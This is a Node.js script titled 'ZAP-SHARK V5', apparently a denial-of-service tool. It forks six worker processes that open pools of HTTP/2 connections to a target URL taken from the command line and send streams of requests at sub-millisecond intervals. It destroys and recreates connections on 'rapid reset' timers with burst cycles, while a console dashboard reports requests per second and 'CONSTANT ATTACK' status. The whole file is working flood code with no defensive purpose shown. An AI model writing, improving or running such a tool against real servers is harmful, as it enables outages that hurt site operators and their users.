const http2 = require('http2');
const os = require('os');
const cluster = require('cluster');

if (cluster.isMaster) {
    console.log('=== ZAP-SHARK V5 HYBRID CORE SYSTEM ===');
    console.log('Target:', process.argv[2] || 'https://target.com');
    console.log('CPU Cores:', os.cpus().length);
    console.log('Hybrid Setup: 6 Cores (4x500ms + 2x1ms)');
    console.log('='.repeat(60));
    
    const hybridConfig = [
        // CORE 0-3: RAPID RESET 500ms (SUSTAINED POWER)
        { type: 'RAPID', id: 0, resetInterval: 500, connections: 10, burst: false },
        { type: 'RAPID', id: 1, resetInterval: 500, connections: 10, burst: false },
        { type: 'APID', id: 2, resetInterval: 500, connections: 10, burst: false },
        { type: 'RAPID', id: 3, resetInterval: 500, connections: 10, burst: false },
        
        // CORE 4-5: HYPER RESET 1ms (BURST CYCLE)
        { type: 'HYPER', id: 4, resetInterval: 1, connections: 20, burst: true, cycle: '15s ON / 10s OFF' },
        { type: 'HYPER', id: 5, resetInterval: 1, connections: 20, burst: true, cycle: '15s ON / 10s OFF' }
    ];
    
    const sharedStats = {
        totalRequests: 0,
        currentRPS: 0,
        peakRPS: 0,
        startTime: Date.now(),
        rapidCores: 0,
        hyperCores: 0
    };
    
    // LAUNCH HYBRID WORKERS
    hybridConfig.forEach(config => {
        const worker = cluster.fork({
            WORKER_TYPE: config.type,
            WORKER_ID: config.id,
            RESET_INTERVAL: config.resetInterval,
            CONNECTIONS: config.connections,
            BURST_MODE: config.burst,
            TARGET_URL: process.argv[2]
        });
        
        worker.on('message', (msg) => {
            if (msg.type === 'stats') {
                sharedStats.totalRequests += msg.requests;
                sharedStats.currentRPS += msg.rps;
                sharedStats.peakRPS = Math.max(sharedStats.peakRPS, sharedStats.currentRPS);
                
                if (msg.workerType === 'RAPID') sharedStats.rapidCores++;
                if (msg.workerType === 'HYPER') sharedStats.hyperCores++;
            }
        });
    });
    
    // DISPLAY
    setInterval(() => {
        const runtime = Math.floor((Date.now() - sharedStats.startTime) / 1000);
        const hours = Math.floor(runtime / 3600);
        const minutes = Math.floor((runtime % 3600) / 60);
        const seconds = runtime % 60;
        const runtimeStr = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        const rapidRPS = sharedStats.currentRPS * 0.6; // 60% from rapid cores
        const hyperRPS = sharedStats.currentRPS * 0.4; // 40% from hyper cores
        const estimatedHyperBurst = hyperRPS * 2.5; // Hyper cores burst 2.5x when active
        
        process.stdout.write('\x1B[2J\x1B[0f');
        console.log(`=== ZAP-SHARK V5 HYBRID CORE ===`);
        console.log(`RUNTIME: ${runtimeStr} | CORES: 6/6 (4RAPID + 2HYPER)`);
        console.log('='.repeat(60));
        console.log(`TOTAL REQUESTS: ${sharedStats.totalRequests.toLocaleString()}`);
        console.log(`COMBINED RPS: ${sharedStats.currentRPS.toFixed(1)} | PEAK: ${sharedStats.peakRPS.toFixed(1)}`);
        console.log(`RAPID CORES (500ms): ${rapidRPS.toFixed(1)} RPS`);
        console.log(`HYPER CORES (1ms): ${hyperRPS.toFixed(1)} RPS (${estimatedHyperBurst.toFixed(1)} during burst)`);
        console.log('='.repeat(60));
        console.log('CYCLE STATUS:');
        console.log('├── Rapid Cores (0-3): CONSTANT ATTACK');
        console.log('├── Hyper Core 4: 15s ON / 10s OFF');
        console.log('└── Hyper Core 5: 15s ON / 10s OFF (staggered)');
        console.log('='.repeat(60));
        
        sharedStats.currentRPS = 0;
        sharedStats.rapidCores = 0;
        sharedStats.hyperCores = 0;
    }, 1000);
    
} else {
// ==================== WORKER IMPLEMENTATION ====================
const WORKER_TYPE = process.env.WORKER_TYPE;
const WORKER_ID = parseInt(process.env.WORKER_ID);
const RESET_INTERVAL = parseInt(process.env.RESET_INTERVAL);
const CONNECTIONS = parseInt(process.env.CONNECTIONS);
const BURST_MODE = process.env.BURST_MODE === 'true';
const TARGET_URL = process.env.TARGET_URL;

class HybridWorker {
    constructor() {
        this.type = WORKER_TYPE; // 'RAPID' or 'HYPER'
        this.id = WORKER_ID;
        this.resetInterval = RESET_INTERVAL;
        this.connections = CONNECTIONS;
        this.burstMode = BURST_MODE;
        this.targetUrl = TARGET_URL;
        this.hostname = new URL(TARGET_URL).hostname;
        
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        
        // HYPER CORE CYCLE CONTROL
        this.burstActive = this.type === 'RAPID'; // Rapid always active
        this.burstStartTime = Date.now();
        this.burstDuration = 15000; // 15 seconds ON
        this.cooldownDuration = 10000; // 10 seconds OFF
        this.lastCycleChange = Date.now();
        
        // CONNECTION SYSTEM
        this.connectionPool = [];
        this.lastConnectionReset = Date.now();
        
        // PERFORMANCE TRACKING
        this.peakWorkerRPS = 0;
        this.burstCount = 0;
        
        this.init();
    }
    
    init() {
        console.log(`[${this.type} Core ${this.id}] Initializing - Reset: ${this.resetInterval}ms`);
        
        // BUILD CONNECTION POOL BASED ON TYPE
        for (let i = 0; i < this.connections; i++) {
            this.createConnection();
        }
        
        // START ATTACK SYSTEM
        setTimeout(() => {
            this.startAttackLoop();
            
            // BURST CYCLE FOR HYPER CORES
            if (this.type === 'HYPER') {
                this.startBurstCycle();
            }
        }, this.id * 200); // Stagger starts
        
        // STATS REPORTING
        setInterval(() => this.reportStats(), 1000);
    }
    
    createConnection() {
        try {
            const client = http2.connect(this.targetUrl, {
                maxSessionMemory: this.type === 'HYPER' ? 16384 : 8192,
                maxDeflateDynamicTableSize: this.type === 'HYPER' ? 65536 : 4096
            });
            
            client.setMaxListeners(this.type === 'HYPER' ? 500 : 100);
            
            this.connectionPool.push({
                client,
                created: Date.now(),
                requestCount: 0,
                lastReset: Date.now()
            });
            
        } catch (err) {
            // SILENT
        }
    }
    
    // TYPE-SPECIFIC RAPID RESET
    performReset() {
        const now = Date.now();
        if (now - this.lastConnectionReset >= this.resetInterval) {
            const resetPercent = this.type === 'HYPER' ? 0.5 : 0.3;
            const resetCount = Math.ceil(this.connectionPool.length * resetPercent);
            
            for (let i = 0; i < resetCount; i++) {
                const index = Math.floor(Math.random() * this.connectionPool.length);
                const conn = this.connectionPool[index];
                
                if (conn && (conn.requestCount > 500 || this.type === 'HYPER')) {
                    try {
                        conn.client.destroy();
                        this.createConnection();
                        this.connectionPool.splice(index, 1);
                    } catch (err) {}
                }
            }
            
            this.lastConnectionReset = now;
        }
    }
    
    // HYPER CORE BURST CYCLE
    startBurstCycle() {
        // STAGGER HYPER CORES (Core 4 immediate, Core 5 delayed)
        const initialDelay = this.id === 4 ? 0 : 7500; // 7.5s offset
        
        setTimeout(() => {
            const cycleLoop = () => {
                const now = Date.now();
                const timeInCycle = (now - this.lastCycleChange) % (this.burstDuration + this.cooldownDuration);
                
                if (timeInCycle < this.burstDuration) {
                    // BURST ACTIVE
                    if (!this.burstActive) {
                        this.burstActive = true;
                        this.burstStartTime = now;
                        this.burstCount++;
                        console.log(`[Hyper Core ${this.id}] BURST ACTIVATED`);
                    }
                } else {
                    // COOLDOWN
                    if (this.burstActive) {
                        this.burstActive = false;
                        this.lastCycleChange = now;
                        console.log(`[Hyper Core ${this.id}] COOLDOWN STARTED`);
                        
                        // REDUCE CONNECTIONS DURING COOLDOWN
                        this.connectionPool.forEach(conn => {
                            try { conn.client.destroy(); } catch (e) {}
                        });
                        this.connectionPool = [];
                    }
                    
                    // REBUILD CONNECTIONS BEFORE NEXT BURST
                    if (timeInCycle > this.cooldownDuration * 0.8) {
                        if (this.connectionPool.length < this.connections) {
                            this.createConnection();
                        }
                    }
                }
                
                setTimeout(cycleLoop, 100);
            };
            
            cycleLoop();
        }, initialDelay);
    }
    
    // ATTACK LOOP
    startAttackLoop() {
        const attackInterval = setInterval(() => {
            if (!this.burstActive && this.type === 'HYPER') return;
            
            // TYPE-SPECIFIC BATCH SIZE
            const batchSize = this.type === 'HYPER' ? 15 : 5;
            
            for (let i = 0; i < batchSize; i++) {
                this.sendRequest();
            }
            
            // PERFORM RESET
            this.performReset();
            
            // CALCULATE RPS
            const now = Date.now();
            const timeDiff = (now - this.lastRpsCalc) / 1000;
            
            if (timeDiff >= 0.9) {
                this.currentRPS = this.requestsSinceLastCalc / timeDiff;
                this.peakWorkerRPS = Math.max(this.peakWorkerRPS, this.currentRPS);
                this.requestsSinceLastCalc = 0;
                this.lastRpsCalc = now;
            }
        }, this.type === 'HYPER' ? 0.5 : 1); // Hyper: 0.5ms, Rapid: 1ms
    }
    
    sendRequest() {
        if (this.connectionPool.length === 0) return;
        
        const streamsThisTick = this.type === 'HYPER' ? 25 : 10;
        
        for (let i = 0; i < streamsThisTick; i++) {
            const conn = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
            if (!conn) continue;
            
            try {
                const req = conn.client.request({
                    ':method': 'GET',
                    ':path': `/?core=${this.type.toLowerCase()}&id=${this.id}&t=${Date.now()}`,
                    ':authority': this.hostname,
                    'x-core-type': this.type,
                    'x-core-id': this.id.toString()
                });
                
                conn.requestCount++;
                
                req.on('response', () => req.destroy());
                req.on('error', () => req.destroy());
                req.on('close', () => {
                    this.totalRequests++;
                    this.requestsSinceLastCalc++;
                });
                
                req.end();
            } catch (err) {
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            }
        }
    }
    
    reportStats() {
        if (process.send) {
            process.send({
                type: 'stats',
                workerType: this.type,
                workerId: this.id,
                requests: this.totalRequests,
                rps: this.currentRPS,
                peakRps: this.peakWorkerRPS,
                connections: this.connectionPool.length,
                burstActive: this.burstActive,
                burstCount: this.burstCount
            });
        }
    }
}

new HybridWorker();
}
